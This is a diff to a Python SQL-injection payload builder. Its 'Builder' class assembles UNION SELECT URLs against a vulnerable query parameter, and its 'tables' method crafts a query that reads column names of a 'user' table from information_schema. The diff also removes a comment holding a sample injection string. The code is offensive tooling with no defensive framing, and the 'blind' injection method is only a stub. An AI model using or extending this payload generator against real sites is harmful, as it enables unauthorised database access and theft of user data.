@@ -19,7 +19,6 @@ class Builder:
         self.union_string = self.delimiter + 'UNION' + self.delimiter + 'SELECT' 
         self.null_url = page.split('=')[0] + '=null'
 
-
     def union_nums(self, num_cols):
         """ Creates the part of the SQLI after 'UNION SELECT'.
             :num_cols: Number of columns in vulnerable statement. 
@@ -62,15 +61,17 @@ class Builder:
 
     
     def tables(self, num_cols, magic_col):
-        #?id=-1 union select 1,2,3,4,5,6,column_name from information_schema.columns where table_name = 'user'
+        """ :num_cols:  Number of columns for UNION statement.
+            :magic_col: Column number that is most visible, and therefore used for injection parameter.
+            :returns:   Dict of strings with queries regarding tables
+        """
+
         union_urls = self.union_nums(num_cols) 
         union_urls[magic_col - 1] = self.delimiter + 'column_name' 
         a = self.null_url + self.delimiter + self.union_string + ','.join(union_urls)
         a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
-        a += self.delimiter + 'where table_name = \'user\''
-        #print a
-        return {'user table' : a}
-
+        a += self.delimiter + 'where' + self.delimiter + 'table_name=\'user\''
+        return {'users' : a}
 
     def blind():
         return 0
